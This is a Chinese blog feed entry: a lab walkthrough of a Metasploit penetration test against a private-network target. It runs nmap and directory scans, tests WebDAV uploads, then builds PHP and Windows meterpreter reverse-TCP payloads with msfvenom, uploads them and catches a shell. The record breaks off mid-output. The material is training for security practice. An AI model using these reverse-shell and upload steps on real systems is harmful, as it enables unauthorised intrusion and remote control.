<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cy9nus&#39;s Blog</title>
  
  <subtitle>人如果没有梦想，跟咸鱼有什么区别</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://cy9nusg4rd3n.github.io/"/>
  <updated>2019-01-25T10:49:55.466Z</updated>
  <id>https://cy9nusg4rd3n.github.io/</id>
  
  <author>
    <name>Cy9nus</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>metasploit渗透流程练习</title>
    <link href="https://cy9nusg4rd3n.github.io/2019/01/25/metasploit%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    <id>https://cy9nusg4rd3n.github.io/2019/01/25/metasploit渗透流程练习/</id>
    <published>2019-01-25T09:58:38.000Z</published>
    <updated>2019-01-25T10:49:55.466Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="metasploit学习"><a href="#metasploit学习" class="headerlink" title="metasploit学习"></a>metasploit学习</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><ol><li><strong>测试靶机主要为192.168.114.29,攻击机为192.168.114.176</strong><blockquote><p>db_nmap -v -n -sn 192.168.114.0/24</p></blockquote></li></ol><a id="more"></a><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">Nmap:</span> Starting Nmap <span class="number">7.60</span> ( <span class="string">https:</span><span class="comment">//nmap.org ) at 2019-01-23 11:36 CST</span></span><br><span class="line">[*] <span class="string">Nmap:</span> Initiating ARP Ping Scan at <span class="number">11</span>:<span class="number">36</span></span><br><span class="line">[*] <span class="string">Nmap:</span> Scanning <span class="number">255</span> hosts [<span class="number">1</span> port/host]</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">[*] <span class="string">Nmap:</span> Host is up.</span><br><span class="line">[*] <span class="string">Nmap:</span> Read data files <span class="string">from:</span> <span class="regexp">/usr/</span>bin<span class="regexp">/../</span>share/nmap</span><br><span class="line">[*] <span class="string">Nmap:</span> Nmap <span class="string">done:</span> <span class="number">256</span> IP addresses (<span class="number">63</span> hosts up) scanned <span class="keyword">in</span> <span class="number">7.80</span> seconds</span><br><span class="line">[*] <span class="string">Nmap:</span> Raw packets <span class="string">sent:</span> <span class="number">493</span> (<span class="number">13.804</span>KB) | <span class="string">Rcvd:</span> <span class="number">105</span> (<span class="number">2.940</span>KB)</span><br></pre></td></tr></table></figure><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ol start="2"><li><p>利用msf的db_namp端口扫描</p><blockquote><p>db_nmap -sV -n -v –open -sS -p0-10000 192.168.114.29</p></blockquote></li><li><p>发现开放端口(主要测试8585)</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">Nmap:</span> PORT     STATE SERVICE     VERSION</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">22</span>/tcp   open  ssh         OpenSSH <span class="number">7.1</span> (protocol <span class="number">2.0</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">1617</span>/tcp open  rmiregistry Java RMI</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">3000</span>/tcp open  http        WEBrick httpd <span class="number">1.3</span><span class="number">.1</span> (Ruby <span class="number">2.3</span><span class="number">.3</span> (<span class="number">2016</span><span class="number">-11</span><span class="number">-21</span>))</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">4848</span><span class="regexp">/tcp open  ssl/</span>http    Oracle GlassFish <span class="number">4.0</span> (Servlet <span class="number">3.1</span>; JSP <span class="number">2.3</span>; Java <span class="number">1.8</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">5985</span><span class="regexp">/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/</span>UPnP)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8020</span>/tcp open  http        Apache httpd</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8027</span>/tcp open  unknown</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8080</span>/tcp open  http        Oracle GlassFish <span class="number">4.0</span> (Servlet <span class="number">3.1</span>; JSP <span class="number">2.3</span>; Java <span class="number">1.8</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8282</span><span class="regexp">/tcp open  http        Apache Tomcat/</span>Coyote JSP engine <span class="number">1.1</span></span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8383</span><span class="regexp">/tcp open  ssl/</span>http    Apache httpd</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8585</span><span class="regexp">/tcp open  http        Apache httpd 2.2.21 ((Win64) PHP/</span><span class="number">5.3</span><span class="number">.10</span> DAV/<span class="number">2</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">9200</span>/tcp open  http        Elasticsearch REST API <span class="number">1.1</span><span class="number">.1</span> (<span class="string">name:</span> Jean Grey-Summers; Lucene <span class="number">4.7</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> MAC <span class="string">Address:</span> <span class="number">00</span>:<span class="number">0</span><span class="string">C:</span><span class="number">29</span>:<span class="string">E5:</span><span class="string">F7:</span><span class="number">74</span> (VMware)</span><br><span class="line">[*] <span class="string">Nmap:</span> Service <span class="string">Info:</span> <span class="string">OS:</span> Windows; <span class="string">CPE:</span> <span class="string">cpe:</span>/<span class="string">o:</span><span class="string">microsoft:</span>windows</span><br><span class="line">[*] <span class="string">Nmap:</span> Read data files <span class="string">from:</span> <span class="regexp">/usr/</span>bin<span class="regexp">/../</span>share/nmap</span><br><span class="line">[*] <span class="string">Nmap:</span> Service detection performed. Please report any incorrect results at <span class="string">https:</span><span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">[*] <span class="string">Nmap:</span> Nmap <span class="string">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">2837.85</span> seconds</span><br><span class="line">[*] <span class="string">Nmap:</span> Raw packets <span class="string">sent:</span> <span class="number">41973</span> (<span class="number">1.847</span>MB) | <span class="string">Rcvd:</span> <span class="number">2269</span> (<span class="number">110.612</span>KB)</span><br></pre></td></tr></table></figure></li></ol><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><ol start="4"><li><p>基于msf的dir_scanner</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search dir_scan</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                Disclosure Date  Rank    Check  Description</span><br><span class="line">   ----                                ---------------  ----    -----  -----------</span><br><span class="line">   auxiliary/scanner/http/dir_scanner                   <span class="built-in">normal</span>  <span class="keyword">Yes</span>    HTTP Directory Scanner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt; use auxiliary/scanner/http/dir_scanner </span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; show <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (auxiliary/scanner/http/dir_scanner):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting                                          Required  Description</span><br><span class="line">   ----        ---------------                                          --------  -----------</span><br><span class="line">   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt  <span class="keyword">no</span>        Path of word dictionary to use</span><br><span class="line">   PATH        /                                                        <span class="keyword">yes</span>       The path  to identify <span class="keyword">files</span></span><br><span class="line">   Proxies                                                              <span class="keyword">no</span>        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                                                               <span class="keyword">yes</span>       The target address range <span class="keyword">or</span> CIDR identifier</span><br><span class="line">   RPORT       <span class="number">80</span>                                                       <span class="keyword">yes</span>       The target port (TCP)</span><br><span class="line">   SSL         false                                                    <span class="keyword">no</span>        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   THREADS     <span class="number">1</span>                                                        <span class="keyword">yes</span>       The number of concurrent threads</span><br><span class="line">   VHOST                                                                <span class="keyword">no</span>        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; <span class="keyword">set</span> threads <span class="comment">30</span></span><br><span class="line">threads <span class="comment">=&gt; 30</span></span><br><span class="line">msf5 <span class="comment">auxiliary(scanner</span>/http/<span class="comment">dir_scanner) &gt; set rhosts 192.168.114.29</span></span><br><span class="line">rhosts <span class="comment">=&gt; 192.168.114.29</span></span><br><span class="line">msf5 <span class="comment">auxiliary(scanner</span>/http/<span class="comment">dir_scanner) &gt; set rport 8585</span></span><br><span class="line">rport <span class="comment">=&gt; 8585</span></span><br><span class="line">msf5 <span class="comment">auxiliary(scanner</span>/http/<span class="comment">dir_scanner) &gt; run</span></span><br><span class="line"></span><br><span class="line">[*] Detecting <span class="comment">error code</span></span><br><span class="line">[*] Using <span class="comment">code</span> <span class="comment">'404'</span><span class="comment"> as not found for 192.168.114.29</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/.../<span class="comment"> 403 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/cgi-bin/<span class="comment"> 403 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/icons/<span class="comment"> 404 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/phpmyadmin/<span class="comment"> 403 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/uploads/<span class="comment"> 200 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/wordpress/<span class="comment"> 200 (192.168.114.29)</span></span><br><span class="line">[*] Scanned <span class="comment">1 of 1 hosts (100% complete)</span></span><br><span class="line">[*] Auxiliary <span class="comment">module execution completed</span></span><br></pre></td></tr></table></figure></li><li><p>发现文件上传路径/uploads</p><h2 id="DAVTest上传测试"><a href="#DAVTest上传测试" class="headerlink" title="DAVTest上传测试"></a>DAVTest上传测试</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# davtest -url http:<span class="comment">//192.168.114.29:8585/uploads</span></span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPENSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads</span></span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line">NOTERandom string <span class="keyword">for</span> this session: NBIRksdIG8d</span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line"> Creating directory</span><br><span class="line">MKCOLFAIL</span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line"> Sending test <span class="keyword">files</span></span><br><span class="line"><span class="keyword">PUT</span>jhtmlSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jhtml</span></span><br><span class="line"><span class="keyword">PUT</span>plSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.pl</span></span><br><span class="line"><span class="keyword">PUT</span>shtmlSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.shtml</span></span><br><span class="line"><span class="keyword">PUT</span>txtSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txt</span></span><br><span class="line"><span class="keyword">PUT</span>aspxSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.aspx</span></span><br><span class="line"><span class="keyword">PUT</span>phpSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.php</span></span><br><span class="line"><span class="keyword">PUT</span>cfmSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cfm</span></span><br><span class="line"><span class="keyword">PUT</span>jspSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jsp</span></span><br><span class="line"><span class="keyword">PUT</span>cgiSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cgi</span></span><br><span class="line"><span class="keyword">PUT</span>htmlSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html</span></span><br><span class="line"><span class="keyword">PUT</span>aspSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.asp</span></span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line"> Checking <span class="keyword">for</span> test <span class="keyword">file</span> execution</span><br><span class="line">EXECjhtmlFAIL</span><br><span class="line">EXECplFAIL</span><br><span class="line">EXECshtmlFAIL</span><br><span class="line">EXECtxtSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txt</span></span><br><span class="line">EXECaspxFAIL</span><br><span class="line">EXECphpSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.php</span></span><br><span class="line">EXECcfmFAIL</span><br><span class="line">EXECjspFAIL</span><br><span class="line">EXECcgiFAIL</span><br><span class="line">EXEChtmlSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html</span></span><br><span class="line">EXECaspFAIL</span><br><span class="line"></span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line">/usr/bin/davtest Summary:</span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jhtml</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.pl</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.shtml</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txt</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.aspx</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.php</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cfm</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jsp</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cgi</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.asp</span></span><br><span class="line">Executes: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txt</span></span><br><span class="line">Executes: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.php</span></span><br><span class="line">Executes: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html</span></span><br></pre></td></tr></table></figure></li><li><p>发现能成功上传txt,php,html</p><h2 id="制作php木马"><a href="#制作php木马" class="headerlink" title="制作php木马"></a>制作php木马</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p php/meterpreter_reverse_tcp <span class="attribute">LHOST</span>=192.168.114.176 <span class="attribute">LPORT</span>=11111 -f<span class="built_in"> raw </span>&gt; ~/Desktop/11111.php</span><br><span class="line">[-] <span class="literal">No</span> platform was selected, choosing Msf::Module::Platform::PHP <span class="keyword">from</span> the payload</span><br><span class="line">[-] <span class="literal">No</span> arch selected, selecting arch: php <span class="keyword">from</span> the payload</span><br><span class="line"><span class="literal">No</span> encoder <span class="keyword">or</span> badchars specified, outputting<span class="built_in"> raw </span>payload</span><br><span class="line">Payload size: 30659 bytes</span><br></pre></td></tr></table></figure></li><li><p>上传一句话菜刀连接也行,但这里主要是基于metasploit的学习，最终远控，权限提升</p><h2 id="向目标传马"><a href="#向目标传马" class="headerlink" title="向目标传马"></a>向目标传马</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# davtest -url http://192.168.114.29:8585/uploads -uploadfile ~/Desktop/11111.php -uploadloc 11111.php</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPENSUCCEED:http://192.168.114.29:8585/uploads</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*</span><br><span class="line"> unless  Uploading file</span><br><span class="line">Upload succeeded: http://192.168.114.29:8585/uploads/11111.php</span><br></pre></td></tr></table></figure></li></ol><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> payload php/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   <span class="literal">yes</span>       The listen<span class="built_in"> address </span>(an<span class="built_in"> interface </span>may be specified)</span><br><span class="line">   LPORT  4444             <span class="literal">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lhost 192.168.114.176</span><br><span class="line">lhost =&gt; 192.168.114.176</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lport 11111</span><br><span class="line">lport =&gt; 11111</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.114.176:11111</span><br></pre></td></tr></table></figure><ol start="9"><li><p>攻击机访问一下<a href="http://192.168.114.29:8585/uploads/11111.php" target="_blank" rel="noopener">http://192.168.114.29:8585/uploads/11111.php</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Meterpreter</span> <span class="selector-tag">session</span> 1 <span class="selector-tag">opened</span> (192<span class="selector-class">.168</span><span class="selector-class">.114</span><span class="selector-class">.176</span><span class="selector-pseudo">:11111</span> <span class="selector-tag">-</span>&gt; 192<span class="selector-class">.168</span><span class="selector-class">.114</span><span class="selector-class">.29</span><span class="selector-pseudo">:53286)</span> <span class="selector-tag">at</span> 2019<span class="selector-tag">-01-23</span> 14<span class="selector-pseudo">:44</span><span class="selector-pseudo">:18</span> +0800</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">meterpreter</span> &gt;</span><br></pre></td></tr></table></figure></li><li><p>成功弹shell</p></li></ol><h2 id="ms18-8120提权"><a href="#ms18-8120提权" class="headerlink" title="ms18_8120提权"></a>ms18_8120提权</h2><ol start="11"><li><p>查看当前用户</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: LOCAL<span class="built_in"> SERVICE </span>(0)</span><br></pre></td></tr></table></figure></li><li><p>进入shell查systeminfo</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">meterpreter</span> &gt; <span class="selector-tag">shell</span></span><br><span class="line"><span class="selector-tag">Process</span> 4520 <span class="selector-tag">created</span>.</span><br><span class="line"><span class="selector-tag">Channel</span> 0 <span class="selector-tag">created</span>.</span><br><span class="line"><span class="selector-tag">Microsoft</span> <span class="selector-tag">Windows</span> <span class="selector-attr">[Version 6.1.7601]</span></span><br><span class="line"><span class="selector-tag">Copyright</span> (<span class="selector-tag">c</span>) 2009 <span class="selector-tag">Microsoft</span> <span class="selector-tag">Corporation</span>.  <span class="selector-tag">All</span> <span class="selector-tag">rights</span> <span class="selector-tag">reserved</span>.</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">C</span>:\<span class="selector-tag">wamp</span>\<span class="selector-tag">bin</span>\<span class="selector-tag">apache</span>\<span class="selector-tag">Apache2</span><span class="selector-class">.2</span><span class="selector-class">.21</span>&gt;<span class="selector-tag">systeminfo</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">Terminate</span> <span class="selector-tag">channel</span> 0? <span class="selector-attr">[y/N]</span>  <span class="selector-tag">y</span></span><br><span class="line"><span class="selector-attr">[-]</span> <span class="selector-tag">Error</span> <span class="selector-tag">running</span> <span class="selector-tag">command</span> <span class="selector-tag">shell</span>: <span class="selector-tag">Rex</span><span class="selector-pseudo">::TimeoutError</span> <span class="selector-tag">Operation</span> <span class="selector-tag">timed</span> <span class="selector-tag">out</span>.</span><br><span class="line"><span class="selector-tag">meterpreter</span> &gt; <span class="selector-tag">sysinfo</span></span><br><span class="line"><span class="selector-attr">[-]</span> <span class="selector-tag">Error</span> <span class="selector-tag">running</span> <span class="selector-tag">command</span> <span class="selector-tag">sysinfo</span>: <span class="selector-tag">Rex</span><span class="selector-pseudo">::TimeoutError</span> <span class="selector-tag">Operation</span> <span class="selector-tag">timed</span> <span class="selector-tag">out</span>.</span><br><span class="line"><span class="selector-tag">meterpreter</span> &gt; </span><br><span class="line"><span class="selector-attr">[*]</span> 192<span class="selector-class">.168</span><span class="selector-class">.114</span><span class="selector-class">.29</span> <span class="selector-tag">-</span> <span class="selector-tag">Meterpreter</span> <span class="selector-tag">session</span> 2 <span class="selector-tag">closed</span>.  <span class="selector-tag">Reason</span>: <span class="selector-tag">Died</span></span><br></pre></td></tr></table></figure></li><li><p>桥接模式下，因为多人共用路由网络太差了，会话很容易断，现在改为NAT模式测试</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机:<span class="number">192.168</span><span class="meta">.75</span><span class="meta">.128</span></span><br><span class="line">靶机:<span class="number">192.168</span><span class="meta">.75</span><span class="meta">.134</span></span><br></pre></td></tr></table></figure></li><li><p>构造exe反弹shell上传到靶机</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/meterpreter<span class="emphasis">_reverse_</span>tcp LHOST=192.168.75.128 LPORT=2222 -f exe -o ~/Desktop/2222.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 179779 bytes</span><br><span class="line">Final size of exe file: 254976 bytes</span><br><span class="line">Saved as: /root/Desktop/2222.exe</span><br><span class="line">root@kali:~# davtest -url http://192.168.75.134:8585/uploads -uploadfile ~/Desktop/2222.exe -uploadloc 2222.exe</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*</span><br><span class="line"> 